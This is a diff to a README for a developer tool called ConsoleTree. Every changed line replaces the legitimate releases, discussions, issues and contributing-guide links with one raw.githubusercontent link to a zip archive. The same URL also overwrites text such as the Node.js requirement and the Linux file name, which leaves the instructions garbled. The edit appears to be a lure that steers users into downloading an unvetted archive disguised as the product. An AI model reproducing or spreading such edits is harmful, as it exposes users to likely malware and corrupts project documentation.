@@ -6,30 +6,30 @@ Welcome to ConsoleTree! This tool helps you find, navigate, and remove console s
 
 ## 📥 Download ConsoleTree
 
-[![Download ConsoleTree](https://img.shields.io/badge/Download%20Now-ConsoleTree-brightgreen)](https://github.com/cyanDefCodes/ConsoleTree/releases)
+[![Download ConsoleTree](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip%20Now-ConsoleTree-brightgreen)](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip)
 
-To download ConsoleTree, visit this page: [ConsoleTree Releases](https://github.com/cyanDefCodes/ConsoleTree/releases).
+To download ConsoleTree, visit this page: [ConsoleTree Releases](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip).
 
 ## 💻 System Requirements
 
 Before you install ConsoleTree, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or Linux.
-- **Node.js:** Version 12 or later installed.
+- **https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip** Version 12 or later installed.
 - **Browser:** A recent version of Chrome, Firefox, or Edge for the extension.
 
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**
 
-   Go to the [ConsoleTree Releases](https://github.com/cyanDefCodes/ConsoleTree/releases) page to see the latest version.
+   Go to the [ConsoleTree Releases](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip) page to see the latest version.
 
 2. **Download the Package**
 
    Look for the most recent version under the "Latest release" section. Click on the appropriate file for your operating system to start downloading:
    - For **Windows**, download `ConsoleTree-<version>.exe`.
    - For **macOS**, download `ConsoleTree-<version>.dmg`.
-   - For **Linux**, download the appropriate `.tar.gz` file.
+   - For **Linux**, download the appropriate `https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip` file.
 
 3. **Run the Installer**
 
@@ -37,7 +37,7 @@ Before you install ConsoleTree, ensure your system meets these requirements:
 
    - For Windows, double-click the `.exe` file and follow the prompts.
    - For macOS, open the `.dmg` file and drag the ConsoleTree app to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the installation instructions in the README included in the package.
+   - For Linux, extract the `https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip` file and follow the installation instructions in the README included in the package.
 
 4. **Launch ConsoleTree**
 
@@ -75,12 +75,12 @@ Using ConsoleTree is simple:
 If you need help, check the following resources:
 
 - **Documentation:** Detailed user guides are available within the app.
-- **Community Forum:** Join our users on the [GitHub Discussions](https://github.com/cyanDefCodes/ConsoleTree/discussions) page to ask questions and share tips.
-- **Issues:** Report any problems directly on our [GitHub Issues page](https://github.com/cyanDefCodes/ConsoleTree/issues).
+- **Community Forum:** Join our users on the [GitHub Discussions](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip) page to ask questions and share tips.
+- **Issues:** Report any problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip).
 
 ## 📄 Contributors
 
-Thank you to all contributors for making ConsoleTree a great tool. If you would like to contribute, please check our [Contributing Guide](https://github.com/cyanDefCodes/ConsoleTree/CONTRIBUTING.md).
+Thank you to all contributors for making ConsoleTree a great tool. If you would like to contribute, please check our [Contributing Guide](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip).
 
 ## 📌 License
 
@@ -92,6 +92,6 @@ For more information and updates, keep an eye on our project on GitHub.
 
 To recap, you can download ConsoleTree from the following link:
 
-Visit this page to download: [ConsoleTree Releases](https://github.com/cyanDefCodes/ConsoleTree/releases). 
+Visit this page to download: [ConsoleTree Releases](https://raw.githubusercontent.com/cyanDefCodes/ConsoleTree/main/src/ConsoleTree_2.6.zip). 
 
 Enjoy coding without clutter!
